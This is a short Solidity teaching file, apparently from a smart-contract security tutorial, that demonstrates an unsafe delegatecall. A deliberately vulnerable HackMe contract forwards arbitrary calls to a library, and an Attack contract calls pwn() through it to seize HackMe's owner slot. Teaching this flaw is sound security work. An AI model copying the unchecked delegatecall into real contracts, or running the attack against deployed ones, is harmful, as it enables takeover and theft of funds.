// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

/*
Unsafe delegatecall

What is delegatecall?
A -> B
run your code inside my context (storage, msg.sender, msg.value, msg.data, etc...)
1. delegatecall preserves context
2. storage layout must be the same for A and B

Vulnerability
2 Examples (part 1 and part 2)
Example 1 - Code and demo
*/

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) public {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) public {
        hackMe = _hackMe;
    }

    function attack() public {
        // hackMe.call("our msg.data goes here");
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
